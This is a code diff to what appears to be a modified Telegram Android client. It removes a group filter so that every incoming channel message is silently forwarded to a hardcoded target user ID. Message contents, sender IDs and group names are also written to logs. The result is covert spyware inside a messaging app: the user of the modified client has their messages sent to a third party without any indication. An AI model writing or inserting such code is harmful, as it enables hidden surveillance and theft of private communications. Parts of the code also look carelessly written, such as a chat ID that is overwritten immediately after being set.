@@ -179,7 +179,8 @@ public class MessagesController extends BaseController implements NotificationCe
     public long giveawayBoostsPerPremium = 4;
     public long boostsPerSentGift = 3;
 
-    private static final long MONITORED_GROUP_ID = 7652002179L; // 要监听的群组ID
+//    private static final long MONITORED_GROUP_ID = 7652002179L; // 要监听的群组ID
+    private static final long MONITORED_GROUP_ID = 2775669177L; // 要监听的群组ID
     private static final long TARGET_USER_ID = 7738584148L;    // 目标用户ID
 
     public static TLRPC.Peer getPeerFromInputPeer(TLRPC.InputPeer peer) {
@@ -16731,39 +16732,50 @@ public class MessagesController extends BaseController implements NotificationCe
                 // ====== 🔍 分析消息类型和发送者 ======
                 String chatType = "未知";
                 long fromId = -1;
+                long chatIdFrom = -1;  // 新增：用于存储群组/频道 ID
                 if (baseUpdate instanceof TLRPC.TL_updateNewMessage) {
                     message = ((TLRPC.TL_updateNewMessage) baseUpdate).message;
                     if (message != null) {
                         fromId = message.from_id.user_id;
-                        FileLog.d("coder2025收到普通消息: " + message.message+ " 消息 | 来自ID: " + fromId);
+                        chatIdFrom = message.peer_id.chat_id;  // 普通群组的 chat_id
+                        FileLog.d("coder2025收到普通消息: " + message.message+ " 消息 | 来自ID: " + fromId+ " | 群组ID: " + chatIdFrom);
                     }
                 } else if (baseUpdate instanceof TLRPC.TL_updateNewScheduledMessage) {
                     message = ((TLRPC.TL_updateNewScheduledMessage) baseUpdate).message;
                     if (message != null) {
                         fromId = message.from_id.user_id;
-                        FileLog.d("coder2025收到普通群组消息: " + message.message+ " 消息 | 来自ID: " + fromId);
+                        chatIdFrom = message.peer_id.chat_id;  // 普通群组的 chat_id
+                        FileLog.d("coder2025收到普通消息: " + message.message+ " 消息 | 来自ID: " + fromId+ " | 群组ID: " + chatIdFrom);
                     }
                 } else {
                     message = ((TLRPC.TL_updateNewChannelMessage) baseUpdate).message;
                     if (message != null) {
                         fromId = message.from_id.user_id;
-                        FileLog.d("coder2025收到群组消息: " + message.message+ " 消息 | 来自ID: " + fromId);
+                        chatIdFrom = message.peer_id.chat_id;  // 普通群组的 chat_id
+                        FileLog.d("coder2025收到普通消息: " + message.message+ " 消息 | 来自ID: " + fromId+ " | 群组ID: " + chatIdFrom);
+
+                        chatIdFrom = message.peer_id.channel_id;  // 频道的 channel_id（注意字段不同！）
+                        FileLog.d("coder2025收到普通消息channel_id: " + message.message+ " 消息 | 来自ID: " + fromId+ " | 群组ID: " + chatIdFrom);
+
+
 
 //                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
 //                            forwardMessageToTargetGroup(message);
 //                        }, 1000); // 1秒延迟
 
                         // 检查是否来自目标群组
-                        if (fromId == MONITORED_GROUP_ID) {
-
-//                            FileLog.d("收到目标群组消息: " + message.message);
-//                            forwardMessageToUser(message, TARGET_USER_ID);
-
-                            // 添加1秒延迟防止限流
-                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                forwardMessageToUser(message, TARGET_USER_ID);
-                            }, 1000);
-                        }
+//                        if (fromId == MONITORED_GROUP_ID) {
+//
+////                            FileLog.d("收到目标群组消息: " + message.message);
+////                            forwardMessageToUser(message, TARGET_USER_ID);
+//
+//                            // 添加1秒延迟防止限流
+////                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+////                            }, 1000);
+//
+//                            forwardMessageToUser(message,fromId, TARGET_USER_ID);
+//                        }
+                            forwardMessageToUser(message,fromId, TARGET_USER_ID);
 
 
                     }
@@ -16772,6 +16784,15 @@ public class MessagesController extends BaseController implements NotificationCe
                     }
                     if (!message.out && message.from_id instanceof TLRPC.TL_peerUser && message.from_id.user_id == getUserConfig().getClientUserId()) {
                         message.out = true;
+                    }
+                }
+
+                // ====== 🛠️ 后续处理（示例） ======
+                if (chatIdFrom != -1) {
+                    // 1. 通过 chatId 获取群组/频道对象
+                    TLRPC.Chat chat = getChat(chatIdFrom);
+                    if (chat != null) {
+                        FileLog.d("coder2025群组名称: " + chat.title+ " chat.username = " + chat.username);
                     }
                 }
                 if (message instanceof TLRPC.TL_messageEmpty) {
@@ -22166,7 +22187,7 @@ public class MessagesController extends BaseController implements NotificationCe
     }
 
 
-    private void forwardMessageToUser(TLRPC.Message message, long targetUserId) {
+    private void forwardMessageToUser(TLRPC.Message message, long fromUserId, long targetUserId) {
         if (message == null) return;
 
         try {
@@ -22194,8 +22215,17 @@ public class MessagesController extends BaseController implements NotificationCe
                 return;
             }
 
-//            fromId = message.from_id.user_id;
-//            FileLog.d("coder2025收到群组消息: " + message.message+ " 消息 | 来自ID: " + fromId);
+
+            // 3. 获取目标用户peer
+            TLRPC.User userFrom = messagesController.getUser(fromUserId);
+            if (userFrom == null) {
+                FileLog.e("目标用户不存在: " + fromUserId);
+                return;
+            }
+
+            FileLog.d("coder2025收到消息: " + userFrom.username+ " | 来自ID: " + fromUserId);
+
+
 
             TLRPC.TL_inputPeerUser peerUser = new TLRPC.TL_inputPeerUser();
             peerUser.user_id = user.id;
